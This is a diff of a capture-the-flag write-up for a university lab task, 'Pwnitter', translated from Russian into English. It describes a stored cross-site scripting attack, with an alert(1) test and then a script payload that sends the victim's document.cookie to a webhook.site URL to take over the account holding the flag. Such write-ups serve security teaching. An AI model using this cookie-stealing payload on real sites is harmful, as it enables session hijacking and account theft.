@@ -1,13 +1,21 @@
-### Pwnitter - http://pwnitter.tasks.prak.seclab.cs.msu.ru/
+![pwn](images/pwn.png)  
+> Pwnitter - http://pwnitter.tasks.prak.seclab.cs.msu.ru/
 
-![pwn](./Cyber-Security-CTF/CMC_MSU/images/pwn.png)
+> [!TIP]
+> You need to log in to the main person's account on the website, as they have the flag on their account.
 
-Если отправить сообщение `script>alert(1)</script>` и зайти в мессэдж - выходит
-модальное окно с алертом.  
-==> Значит выполняется то, что я отправляю  
+If you send a message to yourself
+``` javascript
+<script>alert(1)</script>
+```
 
-Нужно зайти на аккаунт главного
+and go to the message, then it displays
+a modal window with `alert(1)`. 
+This means that what I send to the server is executed after
 
-Отправим `<script>location.href="https://webhook.site/b58ae2d1-50b1-44e1-b88c-9acd2ad9bbdc?"+document.cookie</script>`
+I will send
+``` javascript
+<script>location.href="https://webhook.site/b58ae2d1-50b1-44e1-b88c-9acd2ad9bbdc?"+document.cookie</script>
+```
 
-На вебхук приходят кукки, там уже есть флаг на аккаунте
+Cookies are sent to the webhook, and there is already a flag on the account 🎉
